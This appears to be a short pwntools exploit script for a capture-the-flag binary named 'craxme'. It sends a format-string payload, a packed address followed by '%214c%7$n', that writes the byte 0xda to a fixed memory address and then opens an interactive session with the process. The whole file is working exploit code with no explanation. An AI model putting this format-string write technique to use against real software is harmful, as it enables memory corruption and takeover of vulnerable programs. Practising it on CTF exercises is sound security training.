#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./craxme")
p.recvuntil("Give me magic :")

magic = 0x804a038
targat = 0xda

print "========= DEBUG ========="
print "target = ", magic
print "write = ", targat
print "hex(write) = ", hex(targat)
print "before already padding = ", 
payload = flat([magic])
payload += "%214c%7$n"

p.sendline(payload)
p.interactive()

    


